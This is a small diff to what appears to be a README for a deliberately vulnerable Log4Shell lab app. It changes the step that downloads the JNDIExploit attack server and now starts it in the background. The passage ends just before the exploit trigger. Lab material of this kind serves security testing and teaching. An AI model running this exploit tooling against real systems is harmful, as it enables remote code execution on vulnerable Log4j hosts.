@@ -24,7 +24,7 @@ docker run --rm -d -p 8080:8080 --name log4shell-vulnerable-app-c1as log4shell-v
 ```bash
 wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
 unzip JNDIExploit.v1.2.zip
-java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+nohup java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888 &
 ```
 
 * Then, trigger the exploit using:
